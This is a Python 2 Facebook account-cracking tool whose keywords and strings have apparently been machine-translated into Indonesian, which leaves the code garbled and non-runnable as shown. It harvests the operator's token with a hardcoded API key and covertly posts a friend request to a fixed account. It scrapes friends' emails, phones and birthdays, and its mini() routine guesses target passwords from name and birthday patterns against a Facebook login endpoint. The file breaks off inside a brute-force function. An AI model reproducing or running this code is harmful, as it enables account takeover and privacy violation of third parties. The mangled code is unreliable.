# - * - coding: utf-8 - * -

impor  os , sys , waktu , datetime , acak , hashlib , re , threading , json , getpass , urllib , permintaan , mekanisasi
dari  multiprocessing . pool  import  ThreadPool
coba :
    impor  mekanis
kecuali  ImportError :
    os . sistem ( 'pip2 install mechanize' )
lain :
    coba :
         permintaan impor
    kecuali  ImportError :
        os . sistem ( 'permintaan instalasi pip2' )

dari  permintaan . pengecualian  mengimpor  ConnectionError
dari  mekanis  impor  Browser
memuat ulang ( sys )
sys . setdefaultencoding ( 'utf8' )
br  =  mekanisasi . Browser ()
br . set_handle_robots ( False )
br . set_handle_refresh ( mekanisasi . _http . HTTPRefreshProcessor (), max_time = 1 )
br . addheaders  = [( 'User-Agent' , 'Opera / 9.80 (Android; Opera Mini / 36.2.2254 / 119.132; U; id) Presto / 2.12.423 Versi / 12.16' )]


def  Keluar ():
    cetak  ' \ x1b [1; 91m [!] Tutup'
    os . sys . keluar ()


def  jalan ( z ):
    untuk  e  in  z  +  ' \ n ' :
        sys . stdout . tulis ( e )
        sys . stdout . flush ()
        waktu . tidur ( 0,01 )
logo  =  " \ x1b [1; 92m█████████ \ n  \ x1b [1; 92m█▄█████▄█          \ x1b [1; 97m ● ▬▬▬▬▬▬▬▬ ▬๑۩۩๑▬▬▬▬▬▬▬▬ ● \ n  \ x1b [1; 92m█ \ x1b [1; 93m ▼ dapat dibuka sebelum dilanjutkan   \ x1b [1; 97m- _ --_-- \ x1b [ 1; 92m╔╦╗┌─┐┬─┐┬┌─ ╔═╗╔╗ \ n  \ x1b [1; 92m█   \ x1b [1; 97m   \ x1b [1; 97m _-_-- -_ --__ \ x1b [1; 92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗ \ n  \ x1b [1; 92m█ \ x1b [1; 93m ▲▲▲▲▲ \ x1b [1; 97m-- - _ - \ x1b [1; 92m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝   \ x1b[1; 93mPremium \ n  \ x1b [1; 92m█████████          \ x1b [1; 97m «========== ✧ ==========» \ n  \ x1b [1; 92m ██ ██ \ n  \ x1b [1; 97m╔═════════════════════════════ ═══════════════════╗ \ n  \ x1b [1; 97m║ \ x1b [1; 93m *   \ x1b [1; 97mReCode    \ x1b [1; 91m:   \ x1b [1; 96m Kumpulanremaja   \ x1b [1; 97m ║ \ n  \ x1b [1; 97m║ \ x1b [1; 93m *   \ x1b [1; 97mGitHub    \ x1b [1; 91m:   \ x1b [1; 92m \ x1b[92mhttps: //github.com/kumpulanremaja [     \ x1b [1; 97m ║ \ n  \ x1b [1; 97m║ \ x1b [1; 93m *   \ x1b [1; 97mSite        \ x1b [1; 91m:    \ x1b [ 1; 92 \ x1b [92mhttps: //kumpulanremaja.com \ x1b [      \ x1b [1; 97m ║    \ n  \ x1b [1; 97m╚══════════════════ ══════════════════════════════╝ "   ' \ n \ x1b [1; 92m [*] Silakan Login Operamini atau Google Chrome Agar Tidak Pos Pemeriksaan \ n '


def  tik ():

    titik  = [
     ' ' , ' .. ' , ' ... ' ]
    untuk  o  di  titik :
        cetak  ' \ r \ x1b [1; 91m [ \ xe2 \ x97 \ x8f ] \ x1b [1; 92mMemuatkan \ x1b [1; 97m'  +  o ,
        sys . stdout . flush ()
        waktu . tidur ( 0,01 )


kembali  =  0
utas  = []
berhasil  = []
cekpoint  = []
gagal  = []
idfriends  = []
idfromfriends  = []
idmem  = []
id  = []
em  = []
emfromfriends  = []
hp  = []
hpfromfriends  = []
reaksi  = []
reaksigrup  = []
komen  = []
komengrup  = []
listgrup  = []
vulnot  =  ' \ x1b [31mNidak Vuln'
vuln  =  ' \ x1b [32mVuln'


def  login ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' )
        menu ()
    kecuali ( KeyError , IOError ):
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  ' \ x1b [1; 91m [ \ xe2 \ x98 \ x86 ] \ x1b [1; 92mMASUK AKUN FACEBOOK \ x1b [1; 91m [ \ xe2 \ x98 \ x86 ]'
        id  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 36mPengguna \ x1b [1; 91m: \ x1b [1; 92m' )
        pwd  =  getpass . lolos ( ' \ x1b [1; 91m [+] \ x1b [1; 36mPassword \ x1b [1; 91m: \ x1b [1; 92m' )
        tik ()
        coba :
            br . buka ( 'https://m.facebook.com' )
        kecuali  mekanisasi . URLError :
            cetak  ' \ n \ x1b [1; 91m [!] Tidak Ada Koneksi'
            keluar ()

        br . _factory . is_html  =  Benar
        br . select_form ( nr = 0 )
        br . form [ 'email' ] =  id
        br . form [ 'pass' ] =  pwd
        br . kirim ()
        url  =  br . geturl ()
        jika  'save-device'  di  url :
            coba :
                sig  =  'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = passwordemail ='  +  id  +  'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.loginpassword ='  +  pwd  +  'return_ssl_resources = 0V = 1.062f8ce9f74b12f84c123cc23437a4a32'
                data  = { 'api_key' : '882a8490361da98702bf97a021ddc14d' , 'credentials_type' : 'kata sandi' , 'email' : id , 'format' : 'JSON' , 'menghasilkan_machine_id' : '1' , 'menghasilkan_session_cookies' : '1' , ' lokal ' : ' en_US ' , ' metode ' : ' auth.login ' , ' kata sandi ' : pwd , 'return_ssl_resources ' : ' 0 ' , ' v ' :'1.0' }
                x  =  hashlib . baru ( 'md5' )
                x . perbarui ( sig )
                a  =  x . hexdigest ()
                data . perbarui ({ 'sig' : a })
                url  =  'https://api.facebook.com/restserver.php'
                r  =  permintaan . dapatkan ( url , params = data )
                z  =  json . memuat ( r . teks )
                zedd  =  terbuka ( 'login.txt' , 'w' )
                Zedd . tulis ( z [ 'access_token' ])
                Zedd . tutup ()
                cetak  ' \ n \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mLogin sukses'
                permintaan . pos ( 'https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='  +  z [ 'access_token' ])
                waktu . tidur ( 1 )
                menu ()
            kecuali  permintaan . pengecualian . ConnectionError :
                cetak  ' \ n \ x1b [1; 91m [!] Tidak Ada Koneksi'
                keluar ()

        jika  'pos pemeriksaan'  di  url :
            cetak  ' \ n \ x1b [1; 91m [!] \ x1b [1; 93mAkun Telah Pos Pemeriksaan'
            os . sistem ( 'rm -rf login.txt' )
            waktu . tidur ( 0,01 )
            keluar ()
        lain :
            cetak  ' \ n \ x1b [1; 91m [!] Gagal Masuk'
            os . sistem ( 'rm -rf login.txt' )
            waktu . tidur ( 0,01 )
            login ()


 menu def ():
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        os . sistem ( 'jelas' )
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,01 )
        login ()
    lain :
        coba :
            otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/me?access_token='  +  toket )
            a  =  json . memuat ( ot . teks )
            nama  =  a [ 'name' ]
            id  =  a [ 'id' ]
            ots  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/subscribers?access_token='  +  toket )
            b  =  json . memuat ( ots . text )
            sub  =  str ( b [ 'ringkasan' ] [ 'total_count' ])
        kecuali  KeyError :
            os . sistem ( 'jelas' )
            cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mSepertinya akun kena Checkpoint'
            os . sistem ( 'rm -rf login.txt' )
            waktu . tidur ( 0,01 )
            login ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  logo
            cetak  ' \ x1b [1; 91m [!] Tidak Ada Koneksi'
            keluar ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  ' \ x1b [1; 97m \ XE2 \ x95 \ x94 '  +  50  *  ' \ XE2 \ x95 \ X90 '  +  '╗'
    cetak  ' \ xe2 \ x95 \ x91 \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m Nama \ x1b [1; 91m: \ x1b [1; 92m '  +  nama  + ( 39  -  len ( nama )) *  ' \ x1b [1; 97m '  +  ' ║ '
    cetak  ' \ xe2 \ x95 \ x91 \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m FBID \ x1b [1; 91m: \ x1b [1; 92m '  +  id  + ( 39  -  len ( id )) *  ' \ x1b [1; 97m '  +  ' ║ '
    cetak  ' \ xe2 \ x95 \ x91 \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m Subs \ x1b [1; 91m: \ x1b [1; 92m '  +  sub  + ( 39  -  len ( sub )) *  ' \ x1b [1; 97m '  +  ' ║ '
    mencetak  ' \ x1b [1; 97m╠'  +  50  *  ' \ XE2 \ x95 \ X90 '  +  '╝'
    cetak  '║-> \ x1b [1; 37; 40m1. Informasi pengguna'
    cetak  '║-> \ x1b [1; 37; 40m2. Retas Akun Facebook '
    cetak  '║-> \ x1b [1; 37; 40m3. Bot
    cetak  '║-> \ x1b [1; 37; 40m4. Lainnya
    cetak  '║-> \ x1b [1; 37; 40m5. Memperbarui'
    cetak  '║-> \ x1b [1; 37; 40m6. Keluar'
    cetak  '║-> \ x1b [1; 31; 40m0. Keluar'
    cetak  ' \ x1b [1; 37; 40m║'
    pilih ()


def  pilih ():
    zedd  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  zedd  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        pilih ()
    lain :
        jika  zedd  ==  '1' :
            informasi ()
        lain :
            jika  zedd  ==  '2' :
                menu_hack ()
            lain :
                jika  zedd  ==  '3' :
                    menu_bot ()
                lain :
                    jika  zedd  ==  '4' :
                        lain ()
                    lain :
                        jika  zedd  ==  '5' :
                            os . sistem ( 'jelas' )
                            cetak  logo
                            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                            os . sistem ( 'master tarik asal git' )
                            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                            menu ()
                        lain :
                            jika  zedd  ==  '6' :
                                os . sistem ( 'rm -rf login.txt' )
				os . sistem ( 'xdg-buka https://m.facebook.com/rizz.magizz' )
                                keluar ()
                            lain :
                                jika  zedd  ==  '0' :
                                    keluar ()
                                lain :
                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  zedd  +  ' \ x1b [1; 91mTidak tersedia'
                                    pilih ()


def  informasi ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,01 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    id  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mInput ID \ x1b [1; 97m / \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' )
    jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...' )
    r  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token='  +  toket )
    cok  =  json . memuat ( r . teks )
    untuk  p  dalam  kok [ 'data' ]:
        jika  id  di  p [ 'name' ] atau  id  di  p [ 'id' ]:
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  p [ 'id' ] +  '? access_token ='  +  toket )
            z  =  json . memuat ( r . teks )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            coba :
                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mNama \ x1b [1; 97m:'  +  z [ 'name' ]
            kecuali  KeyError :
                cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mNama \ x1b [1; 97m: \ x1b [1; 91mTidak Ada'
            lain :
                coba :
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mID \ x1b [1; 97m:'  +  z [ 'id' ]
                kecuali  KeyError :
                    cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mID \ x1b [1; 97m: \ x1b [1; 91mTidak Ada'
                lain :
                    coba :
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mEmail \ x1b [1; 97m:'  +  z [ 'email' ]
                    kecuali  KeyError :
                        cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mEmail \ x1b [1; 97m: \ x1b [1; 91mTidak Ada'
                    lain :
                        coba :
                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mNomor Telpon \ x1b [1; 97m:'  +  z [ 'mobile_phone' ]
                        kecuali  KeyError :
                            cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mNomor Telpon \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan'

                        coba :
                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mLokasi \ x1b [1; 97m:'  +  z [ 'location' ] [ 'name' ]
                        kecuali  KeyError :
                            cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mLokasi \ x1b [1; 97m: \ x1b [1; 91mTidak Ada'

                    coba :
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mLahir \ x1b [1; 97m:'  +  z [ 'birthday' ]
                    kecuali  KeyError :
                        cetak  ' \ x1b [1; 91m [?] \ x1b [1; 92mLahir \ x1b [1; 97m: \ x1b [1; 91mTidak Ada'

                coba :
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mSekolah \ x1b [1; 97m:'
                    untuk  q  dalam  z [ 'pendidikan' ]:
                        coba :
                            cetak  ' \ x1b [1; 91m ~ \ x1b [1; 97m'  +  q [ 'school' ] [ 'name' ]
                        kecuali  KeyError :
                            cetak  ' \ x1b [1; 91m ~ \ x1b [1; 91mTidak Ada'

                kecuali  KeyError :
                    lulus

            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu ()
    lain :
        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Pengguna Tidak Ada'
        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
        menu ()


 menu_hack def ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,01 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Mini Hack Facebook ( \ x1b [1; 92mTarget \ x1b [1; 97m) '
    cetak  '║-> \ x1b [1; 37; 40m2. Facebook Multi Bruteforce
    cetak  '║-> \ x1b [1; 37; 40m3. Facebook Super Multi Bruteforce
    cetak  '║-> \ x1b [1; 37; 40m4. BruteForce ( \ x1b [1; 92mTarget \ x1b [1; 97m) '
    cetak  '║-> \ x1b [1; 37; 40m5. Yahoo Clone '
    cetak  '║-> \ x1b [1; 37; 40m6. Ambil ID / Email / HP '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    hack_pilih ()


def  hack_pilih ():
    hack  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  retas  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        hack_pilih ()
    lain :
        jika  retas  ==  '1' :
            mini ()
        lain :
            jika  retas  ==  '2' :
                crack ()
                hasil ()
            lain :
                jika  retas  ==  '3' :
                    super ()
                lain :
                    jika  retas  ==  '4' :
                        brute ()
                    lain :
                        jika  retas  ==  '5' :
                            menu_yahoo ()
                        lain :
                            jika  retas  ==  '6' :
                                ambil ()
                            lain :
                                jika  retas  ==  '0' :
                                    menu ()
                                lain :
                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  retas  +  ' \ x1b [1; 91mTidak ditemukan'
                                    hack_pilih ()


def  mini ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,01 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  ' \ x1b [1; 91m [INFO] Target harus menjadi teman Anda!'
        coba :
            id  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  id  +  '? access_token ='  +  toket )
            a  =  json . memuat ( r . teks )
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
            jalan ( ' \ x1b [1; 91m [+] \ x1b [1; 92m Memeriksa \ x1b [1; 97m ...' )
            waktu . tidur ( 1 )
            jalan ( ' \ x1b [1; 91m [+] \ x1b [1; 92mBuka keamanan \ x1b [1; 97m ...' )
            waktu . tidur ( 1 )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            pz1  =  a [ 'first_name' ] +  '123'
            data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  id  +  '& locale = en_US & password ='  +  PZ1  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
            y  =  json . memuat ( data )
            jika  'access_token'  di  y :
                cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz1
                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                menu_hack ()
            lain :
                jika  'www.facebook.com'  di  y [ 'error_msg' ]:
                    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                    cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                    cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz1
                    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                    menu_hack ()
                lain :
                    pz2  =  a [ 'first_name' ] +  '12345'
                    data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  id  +  '& locale = en_US & password ='  +  pz2  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                    y  =  json . memuat ( data )
                    jika  'access_token'  di  y :
                        cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                        cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz2
                        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                        menu_hack ()
                    lain :
                        jika  'www.facebook.com'  di  y [ 'error_msg' ]:
                            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                            cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                            cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz2
                            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                            menu_hack ()
                        lain :
                            pz3  =  a [ 'last_name' ] +  '123'
                            data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  id  +  '& locale = en_US & password ='  +  pz3  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                            y  =  json . memuat ( data )
                            jika  'access_token'  di  y :
                                cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz3
                                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                menu_hack ()
                            lain :
                                jika  'www.facebook.com'  di  y [ 'error_msg' ]:
                                    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                    cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                                    cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz3
                                    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                    menu_hack ()
                                lain :
                                    lahir  =  a [ 'birthday' ]
                                    pz4  =  lahir . ganti ( '/' , '' )
                                    data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  id  +  '& locale = en_US & password ='  +  pz4  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                                    y  =  json . memuat ( data )
                                    jika  'access_token'  di  y :
                                        cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                        cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz4
                                        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                        menu_hack ()
                                    lain :
                                        jika  'www.facebook.com'  di  y [ 'error_msg' ]:
                                            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                            cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                                            cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                                            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz4
                                            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                            menu_hack ()
                                        lain :
                                            pz5  = ( 'sayang' )
                                            data  =  urllib . urlopen ( 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='  +  id  +  '& locale = en_US & password ='  +  pz5  +  '& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ' )
                                            y  =  json . memuat ( data )
                                            jika  'access_token'  di  y :
                                                cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                                                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                                                cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz5
                                                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                                menu_hack ()
                                            lain :
                                                jika  'www.facebook.com'  di  y [ 'error_msg' ]:
                                                    cetak  ' \ x1b [1; 91m [+] \ x1b [1; 92mDidirikan.'
                                                    cetak  ' \ x1b [1; 91m [!] \ x1b [1; 93mAkun Mungkin Pos Pemeriksaan'
                                                    cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:'  +  a [ 'name' ]
                                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPengguna \ x1b [1; 97m:'  +  id
                                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9e \ xb9 ] \ x1b [1; 92mPassword \ x1b [1; 97m:'  +  pz5
                                                    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                                    menu_hack ()
                                                lain :
                                                    cetak  ' \ x1b [1; 91m [!] Maaf, membuka target kata sandi gagal :('
                                                    cetak  ' \ x1b [1; 91m [!] Coba metode lain.'
                                                    raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                                                    menu_hack ()
        kecuali  KeyError :
            cetak  ' \ x1b [1; 91m [!] Terget tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_hack ()


def  crack ():
     file global
    global yang  idlist
    global  passw
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,01 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
